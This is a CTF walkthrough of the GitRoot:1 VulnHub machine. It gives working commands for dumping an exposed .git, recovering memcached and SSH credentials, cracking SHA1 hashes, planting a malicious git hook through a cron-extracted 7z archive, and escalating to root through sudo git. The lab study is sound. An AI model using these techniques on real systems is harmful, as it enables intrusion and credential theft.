# GitRoot:1 — Walkthrough

- Target VM: VulnHub `GitRoot:1` (`GitRoot.ova`, MD5 `0d7910629ab3b59fbd5c267d7152fd0a`)
- Compute host: `rog-g16` (Ubuntu 24.04, accessed via `ssh seafood-pro@rog-g16`)
- Attacker IP: `192.168.122.1` (libvirt `virbr0`) — Target IP: `192.168.122.243`
- Flags: `user.txt = 8a81007ea736a2b8a72a624672c375f9ac707b5e`, `root.txt = 734ae32be131cd0681f86c03858f4f587a3c69ce`

---

## 0. Lab environment

VirtualBox was installed but its kernel module could not load: the host runs with UEFI Secure Boot enabled and an unenrolled MOK, so the unsigned `vboxdrv` module was rejected (`modprobe: ERROR: could not insert 'vboxdrv': Key was rejected by service`; `mokutil --test-key` → `is not enrolled`). Enrolling a MOK or disabling Secure Boot both require physical/BIOS access, so the VM was run under QEMU/KVM + libvirt instead (in-tree, Canonical-signed KVM modules load fine under Secure Boot).

```bash
# Verify and extract the appliance
md5sum GitRoot.ova
# 0d7910629ab3b59fbd5c267d7152fd0a  GitRoot.ova
tar xf GitRoot.ova                      # GitRoot.ovf + GitRoot-disk001.vmdk (VirtualBox 6.1.8 export)

# Convert the VMDK and import under libvirt default NAT network (DHCP via dnsmasq)
sudo qemu-img convert -p -f vmdk -O qcow2 GitRoot-disk001.vmdk /var/lib/libvirt/images/gitroot.qcow2
sudo virt-install --name gitroot --memory 1024 --vcpus 1 --cpu host-passthrough \
  --disk path=/var/lib/libvirt/images/gitroot.qcow2,format=qcow2,bus=sata --import \
  --osinfo detect=on,require=off --network network=default,model=e1000 \
  --graphics vnc,listen=127.0.0.1 --noautoconsole
```

The guest's `/etc/network/interfaces` pins DHCP to `enp0s3` (the VirtualBox NIC name). Under QEMU/i440fx the NIC is named `ens3`, so no interface came up ("IP ADDRESS IS 127.0.0.1" on the console). Fixed by forcing the name via a systemd `.link` file written offline (qemu-nbd mount of the qcow2), after which the guest obtained a DHCP lease:

```
/etc/systemd/network/10-enp0s3.link
[Match]
MACAddress=52:54:00:37:d8:0a
[Link]
Name=enp0s3
```

```bash
sudo virsh net-dhcp-leases default
#  52:54:00:37:d8:0a  ipv4  192.168.122.243/24  GitRoot
```

---

## 1. Recon

```bash
sudo netdiscover -i virbr0 -r 192.168.122.0/24 -P -N
#  192.168.122.243   52:54:00:37:d8:0a   1   60   Unknown vendor

nmap -A -p- -T4 192.168.122.243
```

```
PORT      STATE SERVICE   VERSION
22/tcp    open  ssh       OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp    open  http      Apache httpd 2.4.38 ((Debian))
|_http-title: Hey Jen
11211/tcp open  memcache?
Service Info: OS: Linux
```

---

## 2. Web + vhost enumeration

```bash
curl -s http://192.168.122.243/
# <p> Hey Jen, just installed wordpress over at wp.gitroot.vuln <br> please go check it out! <p>
```

Base domain is `gitroot.vuln`. Add hosts entry and brute vhosts:

```bash
echo "192.168.122.243 gitroot.vuln wp.gitroot.vuln repo.gitroot.vuln" | sudo tee -a /etc/hosts
gobuster vhost -u http://gitroot.vuln --domain gitroot.vuln --append-domain \
  -w /usr/share/dirb/wordlists/big.txt -t 50 -q
# Found: repo.gitroot.vuln  Status: 200 [Size: 438]
# Found: wp.gitroot.vuln    Status: 200 [Size: 10697]
```

`repo.gitroot.vuln` is a "Code storage" app referencing `get.php`/`set.php` (a memcached front-end) and exposes `/.git`:

```bash
curl -s http://repo.gitroot.vuln/
# Welcome to our code storage area ... Feel free to search our code base at get.php or set code in set.php
curl -s http://repo.gitroot.vuln/.git/HEAD
# ref: refs/heads/master
```

---

## 3. Dump `/.git` and recover credentials

```bash
git clone https://github.com/internetwache/GitTools.git
bash GitTools/Dumper/gitdumper.sh http://repo.gitroot.vuln/.git/ loot/repo_git
cd loot/repo_git && git checkout -- .
git log --all --oneline
# a4e7f08 added some important stuff
# e4e93b4 I need help
# ...
```

Recovered files: `get.php`, `set.php`, `stats.php`, `index.php`, `pablo_HELP.txt`, and a SHA256-named file whose contents are three memcached keys:

```
33513a92...aa.txt:
pablo_S3cret_P@ss
beth_S3cret_P@ss
jen_S3cret_P@ss
```

The committed PHP has sanitized `setSaslAuthData("USERNAME","PASSWORD")`, but the **git history** still contains the real memcached SASL credentials:

```bash
git log --all -p -- get.php set.php | grep -i setSaslAuthData
# -  $gitmem->setSaslAuthData("pablo@gitroot", "ihjedpvqfe");
```

**memcached SASL creds: `pablo@gitroot` / `ihjedpvqfe`**

---

## 4. Loot memcached → SHA1 hashes → crack pablo

memcached (1.5.x) enforces SASL and has `cachedump` disabled, so keys cannot be listed — but the recovered file gives the key names. `scripts/memcached_dump.py` authenticates over the binary protocol (SASL PLAIN) and fetches those keys, which hold SHA1 password hashes:

```bash
python3 scripts/memcached_dump.py 192.168.122.243
# pablo_S3cret_P@ss => 9ebc63a534f8a854941bbbabdf92325fcd2d2e29
# beth_S3cret_P@ss  => c6ded2c7fc7281cefb3a2373005d91eb1f32830e
# jen_S3cret_P@ss   => 6930002a9efc93e8bce7bfc48fb09320eb154e4b
```

Crack with rockyou (raw-SHA1):

```bash
python3 scripts/crack_sha1.py rockyou.txt
# pablo = mastergitar
```

Only pablo's hash is in rockyou (beth/jen are recovered later in the chain).

**pablo : `mastergitar`**

---

## 5. Foothold — user.txt

```bash
sshpass -p 'mastergitar' ssh pablo@192.168.122.243 'id; cat /home/pablo/user.txt'
# uid=1000(pablo) gid=1000(pablo)
```

```
user.txt = 8a81007ea736a2b8a72a624672c375f9ac707b5e
```

---

## 6. Privesc pablo → beth (git history)

```bash
find / -name .git -type d 2>/dev/null        # /opt/auth/.git  (owned by beth)
cd /opt/auth && git log --oneline            # main.c with a strcmp() password check, value sanitized to "PASSWORD"
```

The repo has ~199 `dev-N` branches/commits. One blob still contains the real password in the `strcmp()`:

```bash
for o in $(git rev-list --all --objects | awk '{print $1}'); do
  git cat-file -p "$o" 2>/dev/null | grep 'strcmp(pass'
done | grep -v PASSWORD | sort -u
#   if (strcmp(pass, "r3vpdmspqdb") == 0 ){
```

```bash
sshpass -p 'r3vpdmspqdb' ssh beth@192.168.122.243 'id'   # uid=1001(beth)
```

**beth : `r3vpdmspqdb`**

---

## 7. Privesc beth → jen (git post-commit hook via 7z drop)

jen runs a per-minute cron that extracts any 7z archive dropped in her world-writable `~/public/repos/` into a git repo and commits it (`/home/jen/private/add.sh`, read as root afterwards):

```bash
# jen crontab:  * * * * * /home/jen/private/add.sh
rm -rf /home/jen/private/repo/.git/
cd /home/jen/private/repo/
git init
7za x -aos -o/home/jen/private/repo/ ~jen/public/repos/*
git add .
git commit --allow-empty -m "Thanks beth!"
rm -f /home/jen/public/repos/*
```

Because the archive is extracted *over* the fresh repo, an archive that carries `.git/hooks/post-commit` installs a hook that `git commit` then executes **as jen**. As beth, build and drop the archive:

```bash
mkdir -p /tmp/x/.git/hooks
cat > /tmp/x/.git/hooks/post-commit <<'H'
#!/bin/bash
id > /tmp/jen_7z_proof 2>&1
cp /home/jen/.viminfo /tmp/jen_viminfo_7z 2>/dev/null
chmod 644 /tmp/jen_7z_proof /tmp/jen_viminfo_7z
H
chmod +x /tmp/x/.git/hooks/post-commit
( cd /tmp/x && 7za a -r /tmp/evil.7z .git )
cp /tmp/evil.7z /home/jen/public/repos/evil.7z     # wait up to 60s for the cron

cat /tmp/jen_7z_proof
# uid=1003(jen) gid=1003(jen) groups=1003(jen)
```

The hook exfiltrates jen's `~/.viminfo`, whose vim **search-string history** leaks jen's password:

```
# Search String History (newest to oldest):
?/binzpbeocnexoe
```

`PubkeyAuthentication no` in `sshd_config`, so log in with the password:

```bash
sshpass -p 'binzpbeocnexoe' ssh jen@192.168.122.243 'id'   # uid=1003(jen)
```

**jen : `binzpbeocnexoe`**

---

## 8. Privesc jen → root (sudo git) — root.txt

```bash
echo binzpbeocnexoe | sudo -S -l
# User jen may run the following commands on GitRoot:
#     (ALL) /usr/bin/git
```

`sudo git` → root via GTFOBins. The documented interactive path is `sudo git -p help config` then `!/bin/sh`. Run non-interactively by abusing `core.editor` (launched by `git config -e` as root):

```bash
PAY='cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; cat /root/root.txt > /tmp/root_flag.txt; chmod 644 /tmp/root_flag.txt'
echo binzpbeocnexoe | sudo -S git -c "core.editor=sh -c '$PAY' #" config -e --global

/tmp/rootbash -p -c 'id; cat /root/root.txt'
# uid=1003(jen) gid=1003(jen) euid=0(root)
```

```
root.txt = 734ae32be131cd0681f86c03858f4f587a3c69ce
```

---

## Credential / flag summary

| Stage | Credential / value |
|-------|--------------------|
| memcached SASL | `pablo@gitroot : ihjedpvqfe` |
| pablo (SSH) | `mastergitar` (cracked SHA1 `9ebc63a5…`) |
| beth (SSH) | `r3vpdmspqdb` (git history `strcmp`) |
| jen (SSH) | `binzpbeocnexoe` (jen `.viminfo` search history) |
| root | `sudo /usr/bin/git` → GTFOBins |
| **user.txt** | `8a81007ea736a2b8a72a624672c375f9ac707b5e` |
| **root.txt** | `734ae32be131cd0681f86c03858f4f587a3c69ce` |
